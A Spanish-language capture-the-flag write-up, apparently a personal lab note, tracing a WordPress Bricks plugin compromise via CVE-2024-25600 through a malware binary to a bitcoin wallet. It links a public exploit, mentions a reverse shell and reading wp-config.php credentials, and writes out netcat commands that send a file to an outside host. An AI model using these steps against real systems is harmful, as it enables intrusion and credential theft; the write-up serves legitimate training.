Realizamos un escaneo y descubrimos 4 puertos abiertos
![[Pasted image 20240619073823.png]]

Al acceder al 443 encontramos un plugging bricks el cual tiene la siguiente vulnerabilidad `CVE-2024-25600`
![[Pasted image 20240619073905.png]]

Escaneamos la web con gobuster
![[Pasted image 20240619083910.png]]

Buscamos y encontramos el siguiente exploit, lo descargamos y lo ejecutamos
```
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/tree/main
```
![[Pasted image 20240619074146.png]]


Desde la shell obtenida nos generamos una reverse shell y la mantendremos estable
![[Pasted image 20240619075115.png]]

Ahora leemos el fichero wp-config.php y encontramos unas credenciales
![[Pasted image 20240619075233.png]]

Buscamos procesos sospechosos y encontramos el siguiente
```Bash
systemctl | grep running
```
![[Pasted image 20240619075902.png]]
![[Pasted image 20240619075937.png]]

Revisamos el servicio y vemos que esta activo
![[Pasted image 20240619080018.png]]

Este es el proceso que esta ejecutando
![[Pasted image 20240619080101.png]]

Revisamos la carpeta y encontramos los siguientes archivos
![[Pasted image 20240619080729.png]]

Ahora nos transferiremos el archivo a nuestra maquina con netcat, para ello primero ejecutamos este comando en nuestra maquina
```Bash
nc -l -p 4444 > nm-inet-dialog
```
![[Pasted image 20240619082937.png]]

Y en la maquina victima ejecutamos el siguiente
```Bash
nc -w 3 10.9.0.164 4444 < nm-inet-dialog
```
![[Pasted image 20240619083110.png]]

Y ya habremos obtenido el archivo
![[Pasted image 20240619083215.png]]

Lo analizamos con virustotal y efectvamente es un archivo malicioso
![[Pasted image 20240619084308.png]]

Revisando la informaci칩n que nos ha proporcionado encontramos un fichero el cual esta en la maquina victima
![[Pasted image 20240619085214.png]]

Lo leemos y encontramos un codigo cifrado

Nos identifica que posiblemente esta codificado en hexadecimal
![[Pasted image 20240619081051.png]]

Lo desciframos de hexadecimal a base64
![[Pasted image 20240619090616.png]]

Buscamos la direcci칩n de bitcoin y encontramos la cartera
![[Pasted image 20240619090900.png]]


Analizamos la cartera y revisamos las transacciones
![[Pasted image 20240619091224.png]]

Encontramos una transacci칩n extra침a![[Pasted image 20240619091402.png]]

La analizamos y acabamos encontrando la flag final
![[Pasted image 20240619091909.png]]

